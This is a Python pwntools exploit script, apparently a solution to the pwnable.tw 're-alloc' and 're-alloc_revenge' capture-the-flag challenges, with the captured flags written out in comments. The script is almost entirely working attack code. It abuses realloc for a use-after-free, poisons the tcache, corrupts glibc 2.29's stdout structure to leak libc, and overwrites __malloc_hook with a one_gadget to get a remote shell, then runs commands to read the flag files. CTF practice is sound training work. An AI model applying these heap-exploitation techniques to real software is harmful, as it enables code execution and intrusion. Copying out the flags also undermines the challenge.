from pwn import *

while True:
    context.arch="amd64"
    l = ELF("libc.so") #libc-2.29
    #r = process("./re-alloc", env={"LD_PRELOAD":"./libc-2.29.so"})
    r = remote("chall.pwnable.tw", 10106)
    #r = remote("chall.pwnable.tw", 10310) ## revenge
    

    def alloc(idx, size, data):
        r.sendlineafter(": ", "1")
        r.sendlineafter(":", str(idx))
        r.sendlineafter(":", str(size))
        r.sendafter(":", data)

    def realloc(idx, size, data): ## edit with resize
        r.sendlineafter(": ", "2")
        r.sendlineafter(":", str(idx))
        r.sendlineafter(":", str(size))
        r.sendafter(":", data)

    def free(idx):
        r.sendlineafter(": ", "3")
        r.sendlineafter(":", str(idx))

    def exit():
        r.sendlineafter(": ", "4")

    try:

        alloc(0, 0x58, p64(0xdeadbeef)*10)
        free(0)

        alloc(0, 0x78, "a"*0x78)
        ### Use after free
        r.sendlineafter(": ", "2")
        r.sendlineafter(":", "0") ## idx
        r.sendlineafter(":", "0") ## size

        ### Overwrite fd  
        realloc(0, 0x8, "b"*0x8) 
        #input("123@")
        realloc(0, 0x68, "c"*0x68)
        #input("@")
        free(0)
        #input("@")

        
        alloc(0, 0x78, b"d"*0x18 + p64(0x61) + b"\x10")#p64(0x4040b0)) ### where to write
        #input("@")
        free(0)
        alloc(0, 0x58, "e"*0x28) ### let tcache get the fake chunk addr
        #input("@")
        alloc(1, 0x58, p64(0x0707010002000200) + p64(0x0707070707070707)*7 + p64(0x4040d0)) ### overwrite tcache(0x21 chunk) -> 0x4040d0 
        free(0)        
        
        ### Use after free
        r.sendlineafter(": ", "2")
        r.sendlineafter(":", "0") ## idx
        r.sendlineafter(":", "0") ## size
        
        
        realloc(1, 0x58, p64(0x0707070707070707)*8 + p64(0x4040d0)*3) ## leak = libc + 0x1bfca0
        
        realloc(1, 0x78, p64(0x0707070707070707)*8 + p64(0x4040d0)*4 + b"\x60\x77")
        
        #input("@")
        IO_stdout = l.symbols[b'_IO_2_1_stdout_']
        print(f'IO_stdout: {hex(IO_stdout)}')
        alloc(0, 0x58, p64(0xfbad1800) + p64(0)*3) ## append null byte to rewrite stdio_write_base
        leak_null_byte = u64(r.recvn(8))
        print("leak_null_byte: ", leak_null_byte)
        if(leak_null_byte != 0):
            raise Exception('no leak')
        libc_base = u64(r.recvn(8)) - 0x1c2570 - 0x25000
        print("libc_addr: ", hex(libc_base))

        malloc_hook = libc_base + l.symbols[b'__malloc_hook']
        print("__malloc_hook: ", hex(malloc_hook))
        free_hook = libc_base + l.symbols[b'__free_hook']
        print("__free_hook: ", hex(free_hook))
        #input("@")
        realloc(1, 0x78, p64(0x0707070707070707)*8 + p64(malloc_hook-0x13)*6)
        free(1)
        #input("@")
        one_gadget = libc_base + 0x106ef8 ## 0xe2383 ## 0xe2386 ## 0xe237f ##
        alloc(1, 0x28, b'A'*3 + p64(one_gadget)*4) ## __malloc_hook & __realloc_hook
        
        #input("@")
        r.sendlineafter(": ", "2")
        r.sendlineafter(":", "1") ## idx
        r.sendlineafter(":", str(0x28)) ## size
        
        r.sendline("ls /home")
        r.sendline("cat /home/re-alloc/flag")
        r.sendline("cat /home/re-alloc_revenge/flag")

        r.interactive()
        break
    
    except:
        print("fail gg")
        r.close()


#####
#re-alloc: FLAG{r3all0c_the_memory_r3all0c_the_sh3ll}
#re-alloc_revenge: FLAG{r3alloc_the_heap_r3alloc_the_file_Str34m_r3alloc_my_lif3}
#####